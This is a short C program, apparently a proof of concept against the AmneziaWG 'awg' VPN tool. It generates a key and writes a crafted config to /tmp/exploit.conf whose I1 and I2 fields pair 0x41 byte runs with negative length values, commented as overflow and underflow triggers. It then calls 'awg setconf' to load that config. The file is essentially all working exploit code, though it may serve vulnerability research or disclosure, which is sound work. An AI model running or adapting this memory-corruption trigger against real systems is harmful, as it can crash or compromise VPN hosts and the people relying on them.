#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sched.h>


int main() {
    char privkey[64];
    FILE *fp;

    printf("[+] GENERATE KEY\n");

    fp = popen("awg genkey", "r");
    if (!fp) { perror("awg genkey"); return 1; }
    fgets(privkey, sizeof(privkey), fp);
    pclose(fp);
    privkey[strcspn(privkey, "\n")] = 0;

    printf("[+] Making config\n");

    fp = fopen("/tmp/exploit.conf", "w");
    if (!fp) { perror("fopen"); return 1; }

    fprintf(fp, "[Interface]\n");
    fprintf(fp, "PrivateKey = %s\n", privkey);
    fprintf(fp, "Jc = 4\nJmin = 0\nJmax = 1024\nS1 = 30\nS2 = 40\n");
    fprintf(fp,"I1 = <b 0x41414141414141414141414141414141><r -8>\n"); // overflow PoC
    fprintf(fp,"I2 = <r -8><b 0x41414141414141414141414141414141>\n"); // underflow PoC
    fclose(fp);

    printf("[+] Trigger exploit\n");

    system("awg setconf awgt /tmp/exploit.conf");

    printf("[*] Done\n");

    return 0;
}